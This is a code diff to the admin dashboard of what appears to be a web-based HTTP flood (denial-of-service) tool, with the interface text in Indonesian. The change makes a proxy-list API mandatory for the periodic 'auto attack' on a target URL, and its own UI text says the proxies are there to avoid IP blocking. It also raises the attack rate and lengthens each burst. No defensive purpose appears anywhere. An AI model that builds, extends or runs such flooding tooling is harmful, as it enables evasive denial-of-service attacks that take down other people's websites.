@@ -8,7 +8,7 @@ import { Label } from '@/components/ui/label';
 import { Switch } from '@/components/ui/switch';
 import { Select, SelectContent, SelectGroup, SelectItem, SelectLabel, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { Button } from '@/components/ui/button';
-import { BarChart2, Users, Settings, ShieldAlert, LayoutDashboard, History, CheckCircle, XCircle, AlertTriangle, Power, FileClock, Zap, Target as TargetIcon, Server as ServerIcon, RotateCw, Wifi } from 'lucide-react';
+import { BarChart2, Users, Settings, ShieldAlert, LayoutDashboard, History, CheckCircle, XCircle, AlertTriangle, Power, FileClock, Zap, Target as TargetIcon, Server as ServerIcon, RotateCw, Wifi, Globe } from 'lucide-react';
 import { useState, useEffect, useCallback } from 'react';
 import { startFloodAttack, type FloodStats, getUserIpAddress } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
@@ -54,6 +54,7 @@ export default function AdminDashboardPage() {
   const [isAutoAttackEnabled, setIsAutoAttackEnabled] = useState(false);
   const [autoAttackTargetUrl, setAutoAttackTargetUrl] = useState("");
   const [autoAttackMethod, setAutoAttackMethod] = useState<typeof HTTP_METHODS_BASE[number]>("GET");
+  const [autoAttackProxyApiUrl, setAutoAttackProxyApiUrl] = useState("");
   const [autoAttackStatus, setAutoAttackStatus] = useState("Nonaktif");
   const [autoAttackLogs, setAutoAttackLogs] = useState<AutoAttackLogEntry[]>([]);
   const [isAttacking, setIsAttacking] = useState(false);
@@ -116,6 +117,12 @@ export default function AdminDashboardPage() {
       return;
     }
 
+    if (!autoAttackProxyApiUrl.trim()) {
+        toast({ variant: "destructive", title: "URL API Proksi Diperlukan", description: "Serangan otomatis memerlukan URL API proksi untuk berfungsi dengan andal. Harap isi kolom URL API Proksi Otomatis." });
+        setIsAutoAttackEnabled(false);
+        return;
+    }
+
     setIsAttacking(true);
     setAutoAttackStatus(`Menyerang ${autoAttackTargetUrl} (${autoAttackMethod})...`);
     
@@ -126,10 +133,10 @@ export default function AdminDashboardPage() {
         undefined, // headers
         undefined, // body
         50,        // concurrency (default)
-        50,        // rate (default)
-        10,        // duration (10s burst)
-        undefined, // proxiesString
-        undefined  // proxyApiUrl
+        100,       // rate (higher default for auto)
+        15,        // duration (15s burst)
+        undefined, // proxiesString - Auto attack uses API only
+        autoAttackProxyApiUrl.trim() ? autoAttackProxyApiUrl : undefined  // proxyApiUrl
       );
 
       const statusText = result.error ? `Error: ${result.error}` : `Selesai. Terkirim: ${result.totalSent}, Sukses: ${result.successful}, Gagal: ${result.failed}`;
@@ -157,13 +164,13 @@ export default function AdminDashboardPage() {
     } finally {
       setIsAttacking(false);
     }
-  }, [autoAttackTargetUrl, autoAttackMethod, addAutoAttackLogEntry, toast]);
+  }, [autoAttackTargetUrl, autoAttackMethod, autoAttackProxyApiUrl, addAutoAttackLogEntry, toast]);
 
 
   useEffect(() => {
     let attackIntervalId: NodeJS.Timeout | undefined;
     let countdownIntervalId: NodeJS.Timeout | undefined;
-    const attackCycleDuration = 20000; // 10s attack + 10s wait 
+    const attackCycleDuration = 25000; // 15s attack + 10s wait 
 
     if (isAutoAttackEnabled && validateUrl(autoAttackTargetUrl) && !isAttacking) {
       runSingleAutoAttack(); // Run immediately
@@ -176,12 +183,11 @@ export default function AdminDashboardPage() {
 
       // Countdown logic
       let remaining = attackCycleDuration / 1000;
-      setCountdown(remaining -10); // Initial wait time
+      setCountdown(remaining - 15); // Initial wait time
       countdownIntervalId = setInterval(() => {
         setCountdown(prev => {
             if (prev <= 1) {
-                // Approximate next cycle wait time. +10 is attack, -10 is current attack finished.
-                return (attackCycleDuration / 1000) - 10; 
+                return (attackCycleDuration / 1000) - 15; 
             }
             return prev - 1;
         });
@@ -201,6 +207,11 @@ export default function AdminDashboardPage() {
   const handleToggleAutoAttack = (checked: boolean) => {
     if (checked && !validateUrl(autoAttackTargetUrl)) {
       toast({ variant: "destructive", title: "URL Target Diperlukan", description: "Harap masukkan URL target yang valid sebelum mengaktifkan serangan otomatis." });
+      setIsAutoAttackEnabled(false);
+      return;
+    }
+     if (checked && !autoAttackProxyApiUrl.trim()) {
+      toast({ variant: "destructive", title: "URL API Proksi Diperlukan", description: "Serangan otomatis memerlukan URL API proksi. Harap isi sebelum mengaktifkan." });
       setIsAutoAttackEnabled(false);
       return;
     }
@@ -247,7 +258,7 @@ export default function AdminDashboardPage() {
           <CardContent>
             <div className="text-2xl font-bold">573</div>
             <p className="text-xs text-muted-foreground">
-              +180.1% dari minggu lalu
+              Data statis untuk demonstrasi.
             </p>
           </CardContent>
         </Card>
@@ -259,7 +270,7 @@ export default function AdminDashboardPage() {
           <CardContent>
             <div className="text-2xl font-bold">3</div>
             <p className="text-xs text-muted-foreground">
-              Perlu tinjauan segera
+              Data statis untuk demonstrasi.
             </p>
           </CardContent>
         </Card>
@@ -291,7 +302,7 @@ export default function AdminDashboardPage() {
             Pengaturan Serangan Otomatis
           </CardTitle>
           <CardDescription>
-            Konfigurasi dan aktifkan serangan otomatis periodik ke target. Serangan akan berjalan selama 10 detik setiap siklus (sekitar 20 detik per siklus).
+            Konfigurasi dan aktifkan serangan otomatis periodik ke target. Serangan ini sangat bergantung pada proksi dari API untuk efektivitas dan menghindari pemblokiran.
           </CardDescription>
         </CardHeader>
         <CardContent className="space-y-6">
@@ -304,6 +315,19 @@ export default function AdminDashboardPage() {
               onChange={(e) => setAutoAttackTargetUrl(e.target.value)}
               disabled={isAutoAttackEnabled && isAttacking}
             />
+          </div>
+          <div className="space-y-2">
+            <Label htmlFor="auto-attack-proxy-api" className="flex items-center"><Globe className="mr-2 h-4 w-4" />URL API Proksi Otomatis (Wajib)</Label>
+            <Input 
+              id="auto-attack-proxy-api" 
+              placeholder="https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
+              value={autoAttackProxyApiUrl}
+              onChange={(e) => setAutoAttackProxyApiUrl(e.target.value)}
+              disabled={isAutoAttackEnabled && isAttacking}
+            />
+             <CardDescription>
+                Serangan otomatis sangat disarankan menggunakan proksi untuk menghindari pemblokiran IP. Masukkan URL yang mengembalikan daftar proksi.
+            </CardDescription>
           </div>
           <div className="space-y-2">
             <Label htmlFor="auto-attack-method" className="flex items-center"><ServerIcon className="mr-2 h-4 w-4" />Metode HTTP Otomatis</Label>
@@ -387,7 +411,7 @@ export default function AdminDashboardPage() {
                 </TableRow>
               </TableHeader>
               <TableBody>
-                {manualAttackHistory.map((attack) => (
+                {manualAttackHistory.slice(0, 5).map((attack) => (
                   <TableRow key={attack.id}>
                     <TableCell className="font-medium">{attack.dateTime}</TableCell>
                     <TableCell className="truncate max-w-xs">{attack.targetUrl}</TableCell>
